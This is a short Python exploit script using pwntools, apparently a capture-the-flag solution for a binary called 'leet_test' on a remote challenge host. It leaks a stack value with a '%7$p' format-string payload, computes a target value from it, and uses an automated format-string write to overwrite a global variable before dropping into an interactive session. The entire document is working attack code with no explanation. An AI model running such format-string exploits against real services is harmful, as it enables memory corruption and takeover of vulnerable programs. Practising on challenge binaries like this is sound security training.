# Type: Buffer overflow, Format string 


from pwn import *

def main():
	context.arch = 'x86_64'
	#io = process('./leet_test')
	io = remote('167.172.56.232', 32220)
	payload = '%7$p'

	io.sendlineafter('Please enter your name: ', payload)

	random_value = io.recvline().decode()[9:13]
	random_value = int(random_value, 16)
	target_value = random_value * 0x1337c0de
	
	print(random_value)
	print(hex(target_value))
	
	winner = 0x404078
	#payload = b'12345678910%12$n' + p64(winner)
	#io.sendlineafter('Please enter your name: ', payload)
	
	def exec_fmt(payload):
		io.sendlineafter('Please enter your name: ', payload)
		io.info(f'Format string payload: {payload} sent. ')
		return io.recvline()

	f = FmtStr(exec_fmt, offset=10)
	f.write(winner, target_value)
	f.execute_writes()

	io.interactive()
	
if __name__ == '__main__':
	main()
